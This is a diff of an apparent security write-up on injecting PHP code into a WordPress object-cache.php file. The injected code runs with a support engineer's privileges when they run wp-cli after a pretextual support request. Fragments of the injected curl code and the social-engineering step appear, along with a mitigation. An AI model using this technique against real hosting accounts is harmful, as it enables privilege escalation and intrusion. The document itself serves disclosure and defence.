@@ -162,6 +162,7 @@ Let's inject the following into `wp-content/object-cache.php`. Read the comment 
 	@curl_setopt($c, CURLOPT_HEADER, 0);
        	@$t= curl_exec($c);
         @curl_close($c);
+?>
 ```
 
 So now we contact customer support and say that we cannot upgrade a plugin. When the support engineer executes wp-cli.phar the code in object-cache.php would be executed with their privileges. To be safe they use the `--skip-themes` and `--skip-plugins` arguments. They would see the following:
@@ -207,7 +208,7 @@ $ sudo -u webuser wp-cli.phar plugin list
 ```
 This will prevent the executed code to do anything on the account which is executing the code.
 
-If you have any comments, suggestions or want to get in touch: *_@sp2.io*
+If you have any comments, suggestions or want to get in touch:  *_@sp2.io*
 
 
 Links: 
